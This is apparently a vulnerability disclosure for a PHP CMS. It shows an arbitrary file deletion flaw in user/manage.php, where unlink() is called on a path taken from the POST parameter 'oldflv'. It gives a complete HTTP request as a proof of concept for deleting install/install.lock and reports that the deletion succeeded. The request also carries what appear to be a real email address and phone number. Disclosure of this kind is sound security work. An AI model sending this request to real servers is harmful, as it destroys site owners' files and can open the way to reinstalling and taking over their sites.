

## user/manage.php
### Vulnerability：

`if ($oldflv<>$flv){
	$f="../".$oldflv;
	if (file_exists($f)==true){
	unlink($f);
	}
}`

There is unlink($f) to delete any file by controlling the value of $f

### Control $f：
$oldflv = isset($_POST['oldflv'])?$_POST['oldflv']:'';

### Delete install/install.lock:

`POST /user/manage.php?action=modify HTTP/1.1
Host: 127.0.0.1:85
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://127.0.0.1:85/user/manage.php
Cookie: xxxxxxxx
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 354

somane=%E5%A4%A7%E9%A3%8E&sex=1&email=2132402066%40qq.com&qq=&oldqq=&mobile=&b=0&s=0&province=%E8%AF%B7%E9%80%89%E6%8B%A9%E7%9C%81%E4%BB%BD&city=%E8%AF%B7%E9%80%89%E6%8B%A9%E5%9F%8E%E5%8C%BA&xiancheng=&address=&homepage=&phone=18234070265&fox=&content=%26nbsp%3B&img=%2Fimage%2Fnopic.gif&oldimg=%2Fimage%2Fnopic.gif&flv=&oldflv=&Submit=%E4%BF%AE%E6%94%B9`

Change parameter value:oldflv=install/install.lock

![image](https://github.com/P0rZ9/ZZCMS/blob/master/8.jpg)



delete install/install.lock successfully
![image](https://github.com/P0rZ9/ZZCMS/blob/master/7.jpg)
